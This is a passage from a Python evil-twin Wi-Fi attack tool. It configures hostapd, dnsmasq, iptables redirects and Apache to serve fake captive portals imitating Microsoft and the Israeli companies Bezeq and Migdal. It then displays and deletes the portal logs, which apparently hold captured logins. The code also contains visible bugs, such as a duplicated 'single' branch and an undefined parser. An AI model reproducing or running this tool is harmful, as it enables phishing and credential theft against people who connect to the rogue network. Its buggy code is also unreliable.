    manage_service('NetworkManager', 'start')

    log_file = "/var/log/ca.log"
    if os.path.exists(log_file):
        print(f"[@.@] Displaying contents of {log_file}:")
        try:
            with open(log_file, "r") as f:
                content = f.read().strip()
                if content:
                    print(f"{Colors.DIM}-{Colors.RESET}" * 40)
                    print(f"{Colors.YELLOW}{content}{Colors.RESET}")
                    print(f"{Colors.DIM}-{Colors.RESET}" * 40)
                else:
                    print("[*] Log file is empty.")
        except Exception as e:
            print(f"[-] Could not read log file: {e}")
        print(" ")
        print(f"{Colors.DIM}(#.#) Removing Log file form {log_file} {Colors.RESET}")
        os.remove(log_file)
    
    log_file2 = "/var/log/ca2.log"
    if os.path.exists(log_file2):
        print(f"[@.@] Displaying contents of {log_file}:")
        print(f"{Colors.DIM}------------------------------------:{Colors.RESET}")
        try:
            with open(log_file2, "r") as f:
                content = f.read().strip()
                if content:
                    print(f"{Colors.DIM}-{Colors.RESET}" * 40)
                    print(f"{Colors.YELLOW}{content}{Colors.RESET}")
                    print(f"{Colors.DIM}-{Colors.RESET}" * 40)
                else:
                    print("[*] Log file is empty.")
        except Exception as e:
            print(f"[-] Could not read log file: {e}")
        
        print(f"{Colors.DIM}------------------------------------:{Colors.RESET}")
        print(f"{Colors.DIM}(#.#) Removing Log file form {log_file2} {Colors.RESET}")
        os.remove(log_file2)

    print(f"{Colors.DIM}(#.#) Stopping Apache2 and cleaning configuration... {Colors.RESET}")
    run_command(['systemctl', 'stop', 'apache2'], ignore_errors=True)
    run_command(['a2dissite', 'captive.conf'], ignore_errors=True)
    run_command(['a2dissite', 'captive2.conf'], ignore_errors=True)
    run_command(['a2ensite', '000-default.conf'], ignore_errors=True)
    run_command(['systemctl', 'start', 'apache2'], ignore_errors=True) 
    run_command(['systemctl', 'reload', 'apache2'], ignore_errors=True)
    if os.path.exists("/etc/apache2/sites-available/captive.conf"):
        os.remove("/etc/apache2/sites-available/captive.conf")
    if os.path.exists("/etc/apache2/sites-available/captive2.conf"):
        os.remove("/etc/apache2/sites-available/captive2.conf")

    portal_dir = "/var/www/captive"
    if os.path.exists(portal_dir):
        print(f"{Colors.DIM}(#.#) Removing directory {portal_dir}... {Colors.RESET}")
        shutil.rmtree(portal_dir)
    
    portal_dir2 = "/var/www/captive_dual"
    if os.path.exists(portal_dir2):
        print(f"{Colors.DIM}(#.#) Removing directory {portal_dir2}... {Colors.RESET}")
        shutil.rmtree(portal_dir2)

    if os.path.exists("dnsmasq_dual.conf"):
        os.remove("dnsmasq_dual.conf")
    if os.path.exists("hostapd_24.conf"):
        os.remove("hostapd_24.conf")
    if os.path.exists("hostapd_5.conf"):
        os.remove("hostapd_5.conf")   

    print(f"{Colors.DIM}NICE DAY! {Colors.RESET}")
    sys.exit(0)
#############################################################################

def cleanup(signum, frame):
    print(f"{Colors.DIM}\n\n[*] CTRL+C detected. Cleaning up...{Colors.RESET}")
    
    if dnsmasq_proc:
        dnsmasq_proc.terminate()
        print(f"{Colors.DIM}(#.#) Terminated DNS Server...{Colors.RESET}")
    run_command(['pkill', 'dnsmasq'], ignore_errors=True)
    if hostapd_proc:
        hostapd_proc.terminate()
        print(f"{Colors.DIM}(#.#) Terminated HotSpot...{Colors.RESET}")
    run_command(['pkill', 'hostapd'], ignore_errors=True)


    if script_args.iface:
        print(f"{Colors.DIM}(#.#) Cleaning IPtables rules...{Colors.RESET}")
        rules = [
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
        ]
        for rule in rules:
            run_command(['iptables'] + rule, ignore_errors=True)

    toggle_ip_forwarding(enable=False)

    if script_args.iface:
        print(f"{Colors.DIM}(#.#) Flushing IP from {script_args.iface} {Colors.RESET}")
        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface], ignore_errors=True)
    

    manage_service('systemd-resolved', 'start')
    manage_service('NetworkManager', 'start')

    log_file = "/var/log/ca.log"
    if os.path.exists(log_file):
        print(f"[@.@] Displaying contents of {log_file}:")
        print(f"{Colors.DIM}------------------------------------:{Colors.RESET}")
        try:
            with open(log_file, "r") as f:
                content = f.read().strip()
                if content:
                    print("-" * 40)
                    print(f"{Colors.YELLOW}{content}{Colors.RESET}")
                    print("-" * 40)
                else:
                    print("[*] Log file is empty.")
        except Exception as e:
            print(f"[-] Could not read log file: {e}")
        
        print(f"{Colors.DIM}(#.#) Removing Log file form {log_file} {Colors.RESET}")
        os.remove(log_file)
    

    print(f"{Colors.DIM}(#.#) Stopping Apache2 and cleaning configuration... {Colors.RESET}")
    run_command(['systemctl', 'stop', 'apache2'], ignore_errors=True)
    run_command(['a2dissite', 'captive.conf'], ignore_errors=True)
    run_command(['a2ensite', '000-default.conf'], ignore_errors=True)
    run_command(['systemctl', 'start', 'apache2'], ignore_errors=True)
    run_command(['systemctl', 'reload', 'apache2'], ignore_errors=True)
    if os.path.exists("/etc/apache2/sites-available/captive.conf"):
        os.remove("/etc/apache2/sites-available/captive.conf")


    portal_dir = "/var/www/captive"
    if os.path.exists(portal_dir):
        print(f"{Colors.DIM}(#.#) Removing directory {portal_dir}... {Colors.RESET}")
        shutil.rmtree(portal_dir)
    

    if os.path.exists("dnsmasq.conf"):
        os.remove("dnsmasq.conf")
    if os.path.exists("hostapd.conf"):
        os.remove("hostapd_24.conf")

    print(f"{Colors.DIM}NICE DAY! {Colors.RESET}")
    sys.exit(0)

#########################################################

def parse_args():
    p = argparse.ArgumentParser(prog="EvilN-new2.0.py", description="Just be nice to your neighbors")
    sub = p.add_subparsers(dest="mode", required=True)

    single = sub.add_parser("single", help="choose one single band 2.4GHz or 5GHz")
    src1 = single.add_mutually_exclusive_group(required=True)
    single.add_argument("--band", dest="band", choices=["2.4", "5"], help="Choose WiFi band: 2.4GHz or 5GHz")
    src1.add_argument('--ssid', dest="ssid", help="SSID Name for your Network")
    single.add_argument('--channel', type=int, help="Channel for the network")
    single.add_argument('--network', help="Network address in CIDR format ( 192.168.100.0/24)")
    single.add_argument('--iface', dest="iface", default="wlan0", help="Wireless interface to use. Default wlan0")
    single.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft", "bezeq", "migdal"], default="default", help="Choose Your Captive Portal")

    dual = sub.add_parser("dual", help="works with to bands 2.4GHz and 5GHz")
    src2 = dual.add_mutually_exclusive_group(required=True)
    src2.add_argument('--ssid', dest="ssid", help="SSID Name for your Network")
    dual.add_argument('--network', help="Network address in CIDR format ( 192.168.100.0/24)")
    dual.add_argument("--iface1", dest="iface1",default="wlan1", help="Wireless interface bind to channel 2.4GHz, Deafult wlan1")
    dual.add_argument("--iface2", dest="iface2", default="wlan0", help="Wireless interface bind to channel 5GHz, Default wlan0")
    dual.add_argument("--channel2.4", dest="channel24", default="1", help="Choose 2.4GHz Channel, Bind to iface1")
    dual.add_argument("--channel5", dest="channel5", default="36", help="Choose 5GHz Channel, Bind to iface2")
    dual.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft", "bezeq", "migdal"], default="default", help="Choose Your Captive Portal")

    return p.parse_args()

#############################################################################
def main():
    global script_args
    script_args = parse_args()
    
    CH_24 = set(range(1, 14))
    CH_5_NON_DFS = {36, 40, 44, 48, 149, 153, 157, 161, 165}

    if script_args.mode == "single":
        if script_args.network is None:
            parser.error("Need to use --network x.x.x.x/24")

        if script_args.band and (script_args.ssid is None or script_args.channel is None or script_args.network is None):
            parser.error("--band require --ssid and --channel and --network")

        if script_args.band == "2.4" and script_args.channel not in CH_24:
            parser.error(f"--channel {script_args.channel} Use channels from 1-14")
        if script_args.band == "5" and script_args.channel not in CH_5_NON_DFS:
            parser.error(f"--channel {script_args.channel} Use channels from 36, 40, 44, 48, 149, 153, 157, 161, 165")

        
        check_root()
        check_dependencies()

        signal.signal(signal.SIGINT, cleanup)

        manage_service('NetworkManager', 'stop')
        manage_service('systemd-resolved', 'stop')

        ip_addr = configure_interface(script_args.iface, script_args.network)
        create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)

        if script_args.band == '2.4':
            create_hostapd_conf2_4(script_args.iface, script_args.ssid, script_args.channel)
        elif script_args.band == '5':
            create_hostapd_conf5(script_args.iface, script_args.ssid, script_args.channel)

        setup_apache()

        if script_args.Cap == 'default':
            setup_captive_portal_files("default")
        elif script_args.Cap == 'microsoft':
            setup_captive_portal_files("microsoft")
        elif script_args.Cap == 'bezeq':
            setup_captive_portal_files("bezeq")  
        elif script_args.Cap == 'migdal':
            setup_captive_portal_files("migdal") 

        setup_log_file()

        if script_args.Cap == 'default':
            create_vhost()
        elif script_args.Cap == 'microsoft':
            create_vhost_microsoft()
        elif script_args.Cap == 'bezeq':
            create_vhost_bezeq()
        elif script_args.Cap == 'migdal':
            create_vhost_migdal()

        enable_apache_site()

        if not toggle_ip_forwarding(enable=True):
            cleanup(0, 0)
            sys.exit(1)

        setup_iptables(script_args.iface)

        start_attack()

        while True:
            time.sleep(1)

####################################################################

    elif script_args.mode == "single":

        check_root()
        check_dependencies()

        signal.signal(signal.SIGINT, cleanup_dual)

        manage_service('NetworkManager', 'stop')
        manage_service('systemd-resolved', 'stop')

        time.sleep(1)
        ip_addr = configure_interface(script_args.iface1, script_args.network)
        ip_addr2 = configure_interface(script_args.iface2, script_args.network)
        create_dnsmasq_conf_dual(script_args.iface1,script_args.iface2, ip_addr, script_args.network)

        create_hostapd_conf2_4(script_args.iface1, script_args.ssid, script_args.channel24)
        create_hostapd_conf5(script_args.iface2, script_args.ssid, script_args.channel5)
        
        setup_apache()

        if script_args.Cap == 'default':
            setup_captive_portal_files_dual("default")
            setup_captive_portal_files("default")
        elif script_args.Cap == 'microsoft':
            setup_captive_portal_files_dual("microsoft")
            setup_captive_portal_files("microsoft")   
        elif script_args.Cap == 'bezeq':
            setup_captive_portal_files_dual("bezeq")
            setup_captive_portal_files("bezeq")
        elif script_args.Cap == 'migdal':
            setup_captive_portal_files_dual("migdal")
            setup_captive_portal_files("migdal")              

        setup_log_file_dual()
        setup_log_file()

        if script_args.Cap == 'default':
            create_vhost_dual()
            create_vhost()
        elif script_args.Cap == 'microsoft':
            create_vhost_microsoft_dual()
            create_vhost_microsoft()
        elif script_args.Cap == 'bezeq':
            create_vhost_bezeq_dual()
            create_vhost_bezeq()
        elif script_args.Cap == 'migdal':
            create_vhost_migdal_dual()
            create_vhost_migdal()

        enable_apache_site_dual()
        
        if not toggle_ip_forwarding(enable=True):
            cleanup_dual(0, 0)
            sys.exit(1)

        setup_iptables(script_args.iface1)
        setup_iptables(script_args.iface2)

        start_attack_dual(script_args.channel24, script_args.channel5)

        while True:
            time.sleep(1)

if __name__ == "__main__":
    main()
